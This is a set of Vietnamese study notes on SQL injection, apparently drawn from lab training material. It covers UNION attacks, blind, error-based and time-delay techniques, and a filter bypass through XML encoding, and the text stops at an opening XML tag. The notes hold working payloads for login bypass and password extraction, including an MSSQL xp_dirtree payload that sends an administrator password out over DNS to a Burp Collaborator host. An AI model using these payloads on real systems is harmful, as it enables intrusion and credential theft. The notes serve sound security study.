

```table-of-contents
```



# SQL Injection

## SQLI là gì?
- đây là 1 kiểu lỗ hổng bảo mật web mà attacker có thể can thiệp vào các truy vấn tới database để xâm nhập trái phép vào database của hệ thống
- về cơ bản, các chủng lỗi injection đều chung 1 bản chất: hệ thống nhầm lẫn giữa user input và instruction tức là các câu lệnh để ra lệnh cho hệ thống
- nguyên lý khai thác là ta tìm cách kéo dài, nối dài, chèn thêm các instruction vào input để thao túng đối tượng
**nguyên nhân**: sao lại để user input lọt vào truy vấn sql
=> vì nhu cầu để user truy vấn thông tin từ database, hoặc là lưu, cập nhật các thứ .... gần như là chức năng cơ bản mà bất kỳ web động nào cũng có
=> dẫn tới sql injection là một loại lỗi bảo mật phổ biến và xác suất tìm thấy rất cao
![[Pasted image 20260324221656.png]]

![[Pasted image 20260325203410.png]]

## PHÁT HIỆN SQLI
- dấu ' và quan sát lỗi trả về
- một số cú pháp đặc thù của sql để đánh giá giá trị gốc của điểm nhập và so sánh với 1 giá trị khác, rồi tìm kiếm sự khác biệt có hệ thống trong phản hồi của ứng dụng.
- các điều kiện boolean như OR 1=1 và OR 1=2 để tìm sự khác biệt trong phản hồi
- các payload đc thiêt kế để kích hoạt time delay khi được thực thi trong câu truy vấn sql, quan sát sự khác biệt trong time response
- các paylaod OAST đc thiết kế để kích hoạt một tương tác out of band khi đc thực thi trong câu truy vấn sql, và giám sát mọi tương tác xảy ra.
- sử dụng **burp scanner**

Hầu hết các lỗ hổng sql xảy ra trong mệnh đề ==`WHERE`== của câu truy vấn ==`SELECT`==, bên cạnh:
- trong câu lệnh `UPDATE`, nằm trong các giá trị đc cập nhật hoặc trong mệnh đề `WHERE`
	- trong câu lệnh `INSERT`, nằm trong giá trị đc chèn
	- trong câu lệnh `SELECT`, nằm trong tên bảng, cột, mệnh đề `ORDER BY`
## Truy xuất dữ liệu ẩn - retrieval hidden data

Hãy tưởng tượng một ứng dụng mua sắm hiển thị các sản phẩm trong các danh mục khác nhau. Khi người dùng nhấp vào danh mục **Gifts**, trình duyệt của họ sẽ gửi yêu cầu đến URL:

```https://insecure-website.com/products?category=Gifts ```

Điều này khiến ứng dụng tạo một câu truy vấn SQL để lấy thông tin chi tiết của các sản phẩm liên quan từ cơ sở dữ liệu: 

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1
`
Câu truy vấn SQL này yêu cầu cơ sở dữ liệu trả về:

- Tất cả thông tin chi tiết `*`
- Từ bảng `products`
- Nơi mà `category` là **Gifts**
- Và `released` bằng `1`.

Ràng buộc `released = 1` được sử dụng để ẩn các sản phẩm chưa phát hành. Ta có thể giả định rằng đối với các sản phẩm chưa phát hành, `released = 0`.

Ứng dụng này không triển khai bất kỳ biện pháp phòng thủ nào chống lại các cuộc tấn công SQL injection. Điều này có nghĩa là kẻ tấn công có thể tạo ra cuộc tấn công như sau, ví dụ:
`https://insecure-website.com/products?category=Gifts'--`
Điều này dẫn tới câu query: 
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Điểm quan trọng cần lưu ý là `--` là ký hiệu chú thích (comment) trong SQL. Điều này đồng nghĩa với việc phần còn lại của câu truy vấn sẽ được coi như chú thích và bị bỏ qua. Trong ví dụ này, câu truy vấn sẽ không còn mệnh đề `AND released = 1`. Kết quả là tất cả sản phẩm đều được hiển thị, bao gồm cả những sản phẩm chưa phát hành.
Bạn có thể sử dụng một cuộc tấn công tương tự để khiến ứng dụng hiển thị tất cả sản phẩm trong bất kỳ danh mục nào, kể cả các danh mục mà bạn không biết:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
query:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
Câu truy vấn đã bị sửa đổi sẽ trả về tất cả các mục mà **hoặc** danh mục là **Gifts**, **hoặc** `1=1`. Vì `1=1` luôn đúng, câu truy vấn sẽ trả về toàn bộ dữ liệu.

> **Cảnh báo** Hãy cẩn trọng khi chèn điều kiện `OR 1=1` vào câu truy vấn SQL. Ngay cả khi nó có vẻ vô hại trong ngữ cảnh bạn đang chèn, vẫn rất phổ biến việc ứng dụng sử dụng dữ liệu từ một yêu cầu duy nhất trong nhiều câu truy vấn khác nhau. Nếu điều kiện này lọt vào một câu lệnh `UPDATE` hoặc `DELETE`, ví dụ, nó có thể dẫn đến mất dữ liệu ngoài ý muốn.


## Lật ngược logic ứng dụng - Subverting application logic

Hãy tưởng tượng một ứng dụng cho phép người dùng đăng nhập bằng tên đăng nhập (username) và mật khẩu (password). Nếu người dùng gửi username **wiener**và password là**bluecheese**, ứng dụng kiểm tra thông tin bằng cách thực hiện câu truy vấn SQL sau:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

Nếu câu truy vấn trả về thông tin của một người dùng, việc đăng nhập thành công. Ngược lại, sẽ bị từ chối.

Trong trường hợp này, kẻ tấn công có thể đăng nhập dưới tư cách bất kỳ người dùng nào mà không cần mật khẩu. Họ có thể làm điều đó bằng cách dùng chuỗi chú thích SQL `--` để loại bỏ kiểm tra mật khẩu khỏi mệnh đề `WHERE` của câu truy vấn. Ví dụ, gửi username là `administrator'--` và để trống password sẽ tạo ra câu truy vấn sau:
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
Câu query này trả về người dùng có username là administrator và login thành công với tư cách người dùng đó

## Truy xuất thông tin từ bảng dữ liêu khác
Trong trường hợp ứng dụng phản hồi bằng kết quả của truy vấn SQL, kẻ tấn công có thể sử dụng SQLi để truy xuất dữ liệu từ bảng khác trong db, sử dụng thêm **UNION** để thực hiện truy vấn **SELECT** bổ sung và thêm kết quả vào truy vấn gốc.
Ví dụ, 1 ứng dụng thực hiện truy vấn để lấy thông tin gifts cho người dùng:
`SELECT name, description FROM products WHERE category = 'Gifts'`
kẻ tấn công có thể chèn sqli: `' UNION SELECT username, password FROM users--`

Điều này dẫn tới ứng dụng trả về toàn bộ tài khoản mk cùng tên và mô tả sản phẩm
### UNION attack

Khi một ứng dụng tồn tại lỗ hổng SQLi và kết quả câu truy vấn được trả về trong phản hồi của ứng dụng, có thể dùng ==`UNION`== : cho phép thực hiện một, nhiều câu truy vấn ==`SELECT`== bổ sung và nối kết quả vào query gốc
==`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`==
Câu query trả về một tập kết quả duy nhất với 2 cột, chứa các giá trị từ cột a,b trong table1 và cột c,d trong table2
**Điều kiện với UNION**:
- các query phải cùng số cột trả về
- kiểu dữ liệu trong từng cột phải tương thích giữa các truy vấn riêng lẻ
=> **cần xác định:**
- số lượng cột trả về trong query gốc
- cột nào trong kết quả có kiểu dữ liệu phù hợp để chứa kết quả từ truy vấn chèn thêm

**Xác định số lượng cột**
`2 cách hiệu quả:`
1. chèn một loạt mệnh đề ==`ORDER BY`== và tăng dần số cột tới khi báo lỗi
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```
Chuỗi payload này sẽ chỉnh sửa câu truy vấn gốc để sắp xếp kết quả theo các cột khác nhau trong tập kết quả. Cột trong mệnh đề **`ORDER BY`** có thể được chỉ định bằng chỉ số, vì vậy bạn không cần biết tên của bất kỳ cột nào.
Khi chỉ số cột vượt quá số lượng cột thực tế trong tập kết quả, cơ sở dữ liệu sẽ trả về lỗi, ví dụ:
`The ORDER BY position number 3 is out of range of the number of items in the select list.`
Ứng dụng có thể trả lại thông báo lỗi của cơ sở dữ liệu trong phản hồi HTTP, nhưng cũng có thể trả về thông báo lỗi chung. Trong một số trường hợp khác, nó có thể chỉ đơn giản trả về kết quả rỗng. Dù là trường hợp nào, miễn là bạn nhận ra sự khác biệt trong phản hồi, bạn có thể suy ra được số lượng cột mà câu truy vấn đang trả về

2. gửi một loạt payload `UNION SELECT` với số lượng giá trị `NULL` khác nhau:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```
Nếu số lượng `NULL` ko khớp với số lượng cột, cơ sở dữ liệu sẽ trả về lỗi, ví dụ:
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

Chúng ta sử dụng **`NULL`** làm giá trị trả về từ truy vấn **`SELECT`** được chèn vào vì kiểu dữ liệu trong mỗi cột phải tương thích giữa truy vấn gốc và truy vấn chèn. **`NULL`** có thể chuyển đổi sang mọi kiểu dữ liệu phổ biến, vì vậy nó giúp tăng tối đa khả năng payload thành công khi số lượng cột khớp.

Tương tự như kỹ thuật **`ORDER BY`**, ứng dụng có thể trả lại thông báo lỗi của cơ sở dữ liệu trong phản hồi HTTP, hoặc trả về lỗi chung, hoặc đơn giản là không trả về kết quả nào. Khi số lượng **`NULL`** khớp với số lượng cột, cơ sở dữ liệu sẽ trả về một hàng bổ sung trong tập kết quả, chứa giá trị **`NULL`** ở mỗi cột. Tác động lên phản hồi HTTP phụ thuộc vào mã nguồn của ứng dụng:

- Nếu may mắn, bạn sẽ thấy nội dung bổ sung trong phản hồi, chẳng hạn như một dòng mới trong bảng HTML.
- Ngược lại, giá trị **`NULL`** có thể kích hoạt lỗi khác, chẳng hạn như **`NullPointerException`**.
- Trường hợp xấu nhất, phản hồi sẽ trông giống hệt phản hồi khi số lượng **`NULL`** không khớp, khiến phương pháp này trở nên vô hiệu.

Trên **Oracle**, mọi câu truy vấn **`SELECT`** đều phải sử dụng từ khóa **`FROM`** và chỉ định một bảng hợp lệ. Oracle có một bảng tích hợp sẵn tên là **`dual`** có thể dùng cho mục đích này. Vì vậy, các truy vấn chèn (injected queries) trên Oracle sẽ cần có dạng:
`' UNION SELECT NULL FROM DUAL--`

Các payload được mô tả ở trên sử dụng chuỗi chú thích `--` để bỏ qua phần còn lại của câu truy vấn gốc sau điểm chèn. Trên MySQL, chuỗi `--` phải được theo sau bởi một dấu cách. Ngoài ra, có thể dùng ký tự `#` để đánh dấu phần chú thích

**Xác định số cột bằng useful data type
**
Một cuộc tấn công **SQL injection UNION** cho phép bạn lấy kết quả từ một truy vấn được chèn vào. Dữ liệu quan trọng mà bạn muốn lấy thường ở dạng chuỗi. Điều này có nghĩa là bạn cần tìm một hoặc nhiều cột trong kết quả truy vấn gốc có kiểu dữ liệu là chuỗi hoặc tương thích với dữ liệu chuỗi.
Sau khi xác định được số lượng cột cần thiết, bạn có thể kiểm tra từng cột để xem liệu nó có thể chứa dữ liệu chuỗi hay không. Bạn có thể gửi một loạt payload **`UNION SELECT`** đặt giá trị chuỗi vào từng cột lần lượt. Ví dụ, nếu truy vấn trả về bốn cột, bạn sẽ gửi:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Nếu kiểu dữ liệu ko tương thích với dữ liệu chuỗi, truy vấn chèn sẽ gây ra lỗi cơ sở dữ liệu, ví dụ:
`Conversion failed when converting the varchar value 'a' to data type int.`
Nếu ko có lỗi và phản hồi của ứng dụng chứa thêm nội dung bao gồm giá trị chuỗi đã chèn, thì cột đó phù hợp để truy xuất dữ liệu dạng chuỗi.

**Sử dụng SQLi UNION để truy xuất data**

Khi bạn đã xác định được số lượng cột mà truy vấn gốc trả về và biết được cột nào có thể chứa dữ liệu dạng chuỗi, bạn có thể tiến hành truy xuất dữ liệu quan trọng.
Giả sử rằng:
- Câu truy vấn gốc trả về hai cột, cả hai đều có thể chứa dữ liệu dạng chuỗi.
- Điểm chèn (injection point) nằm trong một chuỗi được bao bởi dấu nháy đơn trong mệnh đề **`WHERE`**.
- Cơ sở dữ liệu có bảng **`users`** với các cột **`username`** và **`password`**.
Trong ví dụ này, bạn có thể truy xuất nội dung bảng **`users`** bằng cách gửi:
`' UNION SELECT username, password FROM users--`
Để thực hiện được cuộc tấn công này, bạn cần biết rằng có một bảng tên là
users và bảng này có hai cột là username và password. Nếu không có thông tin này, bạn sẽ phải đoán tên bảng và cột. Tất cả các hệ quản trị cơ sở dữ liệu hiện đại đều cung cấp cách để kiểm tra cấu trúc cơ sở dữ liệu và xác định bảng cũng như các cột mà chúng chứa.

**Truy xuất nhiều giá trị trong 1 cột**
Trong một số trường hợp, câu truy vấn ở ví dụ trước có thể chỉ trả về **một** cột.
Bạn có thể truy xuất nhiều giá trị trong cùng một cột bằng cách **nối** (concatenate) các giá trị lại với nhau. Có thể chèn thêm một ký tự phân tách để dễ dàng nhận biết các giá trị đã được ghép. Ví dụ, trên **Oracle**, bạn có thể gửi:
`' UNION SELECT username || '~' || password FROM users--`

Ở đây, chuỗi ký hiệu `||` là toán tử nối chuỗi trong Oracle. Truy vấn được chèn này sẽ nối giá trị của các trường **`username`** và **`password`**, được phân tách bởi ký tự `~`.
Kết quả trả về từ truy vấn sẽ chứa toàn bộ danh sách username và password, ví dụ:
```
administrator~s3cure
wiener~peter
carlos~montoya
```
## Kiểm tra DB trong các cuộc tấn công
Để khai thác lỗ hổng **SQL injection**, thường cần thu thập thông tin về cơ sở dữ liệu. Thông tin này bao gồm:

- Loại và phiên bản của phần mềm cơ sở dữ liệu.
- Các bảng và cột mà cơ sở dữ liệu đang chứa.
1. **Loại và phiên bản của db

Bạn có thể xác định loại và phiên bản của cơ sở dữ liệu bằng cách chèn các truy vấn đặc thù cho từng hệ quản trị cơ sở dữ liệu (DBMS) và kiểm tra xem truy vấn nào hoạt động.
Dưới đây là một số truy vấn dùng để xác định phiên bản cơ sở dữ liệu của các hệ phổ biến:

| Loại CSDL        | Truy vấn                  |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
Ví dụ, có thể SQLi với payload: `' UNION SELECT @@version--`
Microsoft SQL sẽ trả về:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
2. liệt kê nội dung của db
Hầu hết các loại cơ sở dữ liệu (ngoại trừ **Oracle**) đều có một tập các view gọi là **information schema**. Đây là nơi cung cấp thông tin về cấu trúc cơ sở dữ liệu.
Ví dụ, bạn có thể truy vấn **`information_schema.tables`** để liệt kê các bảng trong cơ sở dữ liệu:
`SELECT * FROM information_schema.tables`

Kết quả trả về:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Có thể truy vấn các cột trong 1 bảng cụ thể:
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Kết quả trả về:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
## Blind SQL
**SQL injection mù** xảy ra khi một ứng dụng dễ bị tấn công SQL injection, nhưng phản hồi HTTP của nó **không chứa kết quả của truy vấn SQL liên quan** hoặc **chi tiết của bất kỳ lỗi nào từ cơ sở dữ liệu**.
Nhiều kỹ thuật như tấn công `UNION` không hiệu quả đối với các lỗ hổng SQL injection mù. Nguyên nhân là vì chúng dựa vào khả năng nhìn thấy kết quả của truy vấn đã chèn trong phản hồi của ứng dụng.
Vẫn có thể khai thác SQL injection mù để truy cập dữ liệu trái phép, nhưng cần sử dụng các kỹ thuật khác
### phản hồi có điều kiện

Hãy xem xét một ứng dụng sử dụng cookie theo dõi để thu thập dữ liệu phân tích về việc sử dụng. Các yêu cầu gửi đến ứng dụng bao gồm một header cookie như sau:
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
Khi một yêu cầu chứa cookie đc xử lý, ứng dụng sẽ query để xem đây có phải user đã biết hay ko:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
Truy vấn này dễ bị tấn công SQL injection, nhưng kết quả từ truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng lại có hành vi khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một `TrackingId` đã được nhận diện, truy vấn sẽ trả về dữ liệu và bạn sẽ nhận được thông báo **"Welcome back"** trong phản hồi.

Hành vi này đủ để có thể khai thác lỗ hổng SQL injection mù. Bạn có thể lấy thông tin bằng cách kích hoạt các phản hồi khác nhau có điều kiện, dựa trên một điều kiện được chèn vào truy vấn.

Để hiểu cách khai thác này hoạt động, giả sử rằng hai yêu cầu lần lượt được gửi đi, chứa giá trị cookie `TrackingId` như sau:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
Giá trị đầu tiên khiến truy vấn trả về kết quả, vì điều kiện chèn vào `AND '1'='1` là **đúng**. Kết quả là thông báo **"Welcome back"** sẽ được hiển thị.
Giá trị thứ hai khiến truy vấn **không** trả về kết quả, vì điều kiện chèn vào là **sai**. Thông báo **"Welcome back"** sẽ không được hiển thị.
Điều này cho phép chúng ta xác định câu trả lời cho bất kỳ điều kiện nào được chèn vào, và từ đó trích xuất dữ liệu từng phần một.
Ví dụ, giả sử có một bảng tên là `Users` với các cột `Username` và `Password`, và có một người dùng tên **`Administrator`**.
Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một loạt dữ liệu đầu vào để kiểm tra mật khẩu từng ký tự một.
Để thực hiện, bắt đầu với dữ liệu đầu vào sau:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
Yêu cầu này trả về thông báo **"Welcome back"**, cho thấy điều kiện chèn vào là **đúng**, và ký tự đầu tiên của mật khẩu **lớn hơn** `m`.
Tiếp theo, gửi dữ liệu đầu vào sau:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
Yêu cầu này **không** trả về thông báo **"Welcome back"**, cho thấy điều kiện là **sai**, và ký tự đầu tiên của mật khẩu **không lớn hơn** `t`.

Cuối cùng, gửi dữ liệu đầu vào sau, và yêu cầu này trả về thông báo **"Welcome back"**, xác nhận rằng ký tự đầu tiên của mật khẩu là `s`:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
Chúng ta có thể tiếp tục quy trình này để xác định toàn bộ mật khẩu của người dùng **Administrator** một cách có hệ thống.

> **Lưu ý** Hàm `SUBSTRING` trong một số loại cơ sở dữ liệu có tên là `SUBSTR`.
### error-based SQLi
SQL injection dựa trên lỗi đề cập đến các trường hợp bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy luận dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong bối cảnh **blind SQLi**.

Khả năng khai thác phụ thuộc vào cấu hình của cơ sở dữ liệu và loại lỗi mà bạn có thể kích hoạt:

- Bạn có thể khiến ứng dụng trả về phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức boolean. Bạn có thể khai thác điều này theo cách tương tự như kỹ thuật kích hoạt phản hồi có điều kiện đã đề cập ở phần trước.
- Bạn có thể kích hoạt thông báo lỗi hiển thị dữ liệu do truy vấn trả về. Điều này về cơ bản biến một lỗ hổng blind SQL injection thành một lỗ hổng SQL injection hiển thị dữ liệu trực tiếp.
**lỗi có điều kiện**
Một số ứng dụng thực hiện truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật ở phần trước sẽ không hiệu quả, vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt trong phản hồi của ứng dụng.

Trong nhiều trường hợp, bạn có thể khiến ứng dụng trả về phản hồi khác nhau tùy thuộc vào việc lỗi SQL có xảy ra hay không. Bạn có thể sửa đổi truy vấn sao cho nó chỉ gây ra lỗi cơ sở dữ liệu nếu điều kiện là **đúng**. Rất thường xuyên, một lỗi chưa được xử lý do cơ sở dữ liệu ném ra sẽ gây ra sự khác biệt trong phản hồi của ứng dụng, chẳng hạn như hiển thị thông báo lỗi. Điều này cho phép bạn suy luận tính đúng sai của điều kiện được chèn.

Để hiểu cách kỹ thuật này hoạt động, giả sử có hai request được gửi đi, lần lượt chứa các giá trị cookie `TrackingId` như sau:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Các input này sử dụng từ khóa `CASE` để kiểm tra một điều kiện và trả về một biểu thức khác nhau tùy thuộc vào việc điều kiện đó đúng hay sai:
- Với input đầu tiên, biểu thức **`CASE`** được đánh giá thành `'a'`, điều này **không** gây ra bất kỳ lỗi nào.
- Với input thứ hai, biểu thức **`CASE`** được đánh giá thành `1/0`, điều này gây ra lỗi chia cho 0 (_divide-by-zero error_).
Nếu lỗi này khiến phản hồi HTTP của ứng dụng thay đổi, bạn có thể sử dụng nó để xác định xem điều kiện được chèn vào là **đúng** hay **sai**.
Bằng cách sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator'
AND SUBSTRING(Password, 1, 1) > 'm')
THEN 1/0 ELSE 'a' END FROM Users)='a`

Lưu ý Có nhiều cách khác nhau để kích hoạt lỗi có điều kiện, và mỗi kỹ thuật sẽ phù hợp nhất với các loại cơ sở dữ liệu khác nhau.
### Time delay
Nếu ứng dụng bắt và xử lý các lỗi từ cơ sở dữ liệu một cách trơn tru, thì sẽ không có sự khác biệt trong phản hồi của ứng dụng. Điều này đồng nghĩa với việc kỹ thuật gây lỗi có điều kiện (conditional errors) ở phần trước sẽ không hoạt động.
Trong trường hợp này, ta vẫn có thể khai thác lỗ hổng **blind SQL injection** bằng cách tạo **độ trễ thời gian** dựa trên việc điều kiện chèn vào là **đúng** hay **sai**.

Vì truy vấn SQL thường được xử lý **đồng bộ** (synchronous) với ứng dụng, nên việc làm chậm quá trình thực thi truy vấn SQL cũng sẽ **làm chậm phản hồi HTTP**. Từ đó, ta có thể **xác định** tính đúng sai của điều kiện dựa trên **thời gian phản hồi** nhận được.

Ví dụ, với **Microsoft SQL Server**, bạn có thể sử dụng câu lệnh sau để kiểm tra một điều kiện và kích hoạt độ trễ nếu điều kiện đó **đúng**:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
- Ở câu lệnh đầu tiên, điều kiện `1=2` là **sai** nên **không có** độ trễ.
- Ở câu lệnh thứ hai, điều kiện `1=1` là **đúng** nên sẽ tạo ra **độ trễ 10 giây**.

Bằng kỹ thuật này, ta có thể **trích xuất dữ liệu** bằng cách kiểm tra từng ký tự một, ví dụ:
```
'; IF (SELECT COUNT(Username)
       FROM Users
       WHERE Username = 'Administrator'
       AND SUBSTRING(Password, 1, 1) > 'm') = 1
   WAITFOR DELAY '0:0:{delay}'--
```
> **Ghi chú:**
> 
> Có nhiều cách khác nhau để tạo ra độ trễ thời gian trong truy vấn SQL, và mỗi loại cơ sở dữ liệu sẽ có kỹ thuật riêng.

### Out of band OAST
Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước, nhưng **thực thi bất đồng bộ**. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong **luồng ban đầu**, đồng thời sử dụng **một luồng khác** để thực thi truy vấn SQL dựa trên cookie `tracking`.

Truy vấn này **vẫn tồn tại lỗ hổng SQL injection**, nhưng **không kỹ thuật nào** ở các phần trước áp dụng được, vì:

- Phản hồi của ứng dụng **không phụ thuộc** vào dữ liệu truy vấn trả về.
- **Không xảy ra lỗi** từ cơ sở dữ liệu.
- **Không phụ thuộc** vào thời gian thực thi truy vấn.

Trong trường hợp này, ta thường có thể khai thác lỗ hổng **blind SQL injection** bằng cách **kích hoạt các tương tác mạng out-of-band** đến một hệ thống do ta kiểm soát. Các tương tác này có thể được **kích hoạt dựa trên điều kiện** được chèn vào truy vấn, giúp **suy luận thông tin từng phần**. Hữu ích hơn, dữ liệu thậm chí có thể được **trích xuất trực tiếp** trong quá trình tương tác mạng này.

Nhiều giao thức mạng có thể dùng cho mục đích này, nhưng **thường hiệu quả nhất là DNS (Domain Name Service)**. Lý do: phần lớn các mạng trong môi trường production cho phép DNS truy vấn ra ngoài (free egress) vì đây là thành phần thiết yếu cho hoạt động bình thường của hệ thống.

**Công cụ đơn giản và đáng tin cậy nhất để sử dụng kỹ thuật out-of-band** là **Burp Collaborator**. Đây là một máy chủ cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm cả **DNS**.

Burp Collaborator cho phép bạn phát hiện khi có **tương tác mạng** xảy ra do gửi các payload riêng lẻ tới ứng dụng có lỗ hổng. **Burp Suite Professional** tích hợp sẵn một client được cấu hình để làm việc với Burp Collaborator **ngay khi cài đặt**.

Các kỹ thuật để kích hoạt một truy vấn DNS phụ thuộc vào **loại cơ sở dữ liệu** đang dùng.

Ví dụ, trên **Microsoft SQL Server**, bạn có thể dùng payload sau để tạo một truy vấn DNS đến tên miền chỉ định:
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
Lệnh trên khiến cơ sở dữ liệu thực hiện truy vấn DNS tới tên miền:
`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
Bạn có thể sử dụng Burp Collaborator để **tạo ra một subdomain duy nhất**, sau đó **poll** (truy vấn) máy chủ Collaborator để xác nhận thời điểm có bất kỳ truy vấn DNS nào xảy ra.

Sau khi đã xác nhận được cách kích hoạt **tương tác out-of-band**, bạn có thể sử dụng kênh out-of-band để **exfiltrate dữ liệu** từ ứng dụng có lỗ hổng. Ví dụ:
```
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
Payload này sẽ:

1. Đọc mật khẩu của user **Administrator** từ bảng `users`.
2. Nối giá trị mật khẩu đó với một subdomain duy nhất của **Burp Collaborator**.
3. Kích hoạt một truy vấn DNS tới tên miền đó.

Ví dụ, nếu truy vấn DNS được ghi nhận là:
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.ne`
Lúc này bạn có thể thấy mật khẩu (`S3cure`) trực tiếp trong subdomain được gửi đi.

Kỹ thuật **out-of-band (OAST)** là một phương pháp mạnh mẽ để phát hiện và khai thác blind SQL injection, vì:

- Xác suất thành công cao.
- Có khả năng exfiltrate dữ liệu trực tiếp qua kênh out-of-band.

Vì lý do này, OAST thường **được ưu tiên** ngay cả khi các kỹ thuật blind SQL injection khác vẫn hoạt động.

> **Ghi chú:**
> 
> Có nhiều cách để kích hoạt tương tác out-of-band, và mỗi loại cơ sở dữ liệu có thể áp dụng kỹ thuật khác nhau.
## Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi chi tiết từ SQL
Việc cấu hình sai cơ sở dữ liệu đôi khi dẫn đến các thông báo lỗi chi tiết (_verbose error messages_). Những thông báo này có thể cung cấp thông tin hữu ích cho kẻ tấn công.

Ví dụ, hãy xem thông báo lỗi sau, xuất hiện sau khi chèn một dấu nháy đơn (**'**) vào tham số `id`:
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
Thông báo này cho thấy toàn bộ câu truy vấn mà ứng dụng đã tạo ra bằng dữ liệu nhập của chúng ta.

Trong trường hợp này, ta có thể thấy mình đang chèn payload vào một chuỗi được đặt trong dấu nháy đơn, bên trong câu lệnh **WHERE**.

Điều này giúp việc xây dựng một truy vấn hợp lệ chứa payload độc hại trở nên dễ dàng hơn.

Bằng cách **comment** phần còn lại của câu truy vấn, chúng ta có thể ngăn dấu nháy đơn thừa gây lỗi cú pháp.

**Đôi khi**, bạn có thể khiến ứng dụng tạo ra thông báo lỗi chứa **một phần dữ liệu** được trả về từ truy vấn. Điều này sẽ biến một lỗ hổng **blind SQL injection** thành một lỗ hổng **hiển thị** (visible), giúp việc khai thác dễ dàng hơn.

Bạn có thể sử dụng hàm **`CAST()`** để làm điều này. Hàm này cho phép bạn chuyển đổi dữ liệu từ một kiểu này sang kiểu khác.

Ví dụ, giả sử câu truy vấn chứa đoạn:
`CAST((SELECT example_column FROM example_table) AS int)`
Thông thường, dữ liệu bạn muốn đọc là chuỗi (string). Khi cố gắng chuyển đổi nó sang một kiểu không tương thích, như int, cơ sở dữ liệu có thể trả về lỗi tương tự như:
`ERROR: invalid input syntax for type integer: "Example data"`
Kiểu truy vấn này cũng hữu ích nếu có giới hạn số ký tự khiến bạn không thể sử dụng phương pháp conditional responses (phản hồi điều kiện).

## SQLi trong các TH khác
Trong các lab trước, bạn đã sử dụng **query string** để chèn payload SQL độc hại. Tuy nhiên, bạn có thể thực hiện tấn công SQL injection bằng **bất kỳ dữ liệu đầu vào nào** mà bạn có thể kiểm soát và được ứng dụng xử lý thành một câu truy vấn SQL.

Ví dụ, một số trang web nhận dữ liệu đầu vào ở dạng **JSON** hoặc **XML** và sử dụng dữ liệu này để truy vấn cơ sở dữ liệu.

Các định dạng khác nhau này có thể mang lại những cách mới để **làm mờ (obfuscate)** các cuộc tấn công vốn bị chặn bởi WAF hoặc các cơ chế phòng thủ khác.

Các triển khai bảo mật yếu thường tìm kiếm các từ khóa SQL injection phổ biến trong request, vì vậy bạn có thể **vượt qua bộ lọc** bằng cách mã hóa hoặc escape các ký tự trong những từ khóa bị cấm.

Ví dụ, đoạn XML-based SQL injection dưới đây sử dụng **chuỗi escape XML** để mã hóa ký tự **S** trong từ **SELECT**:
```xml
<stockCheck>
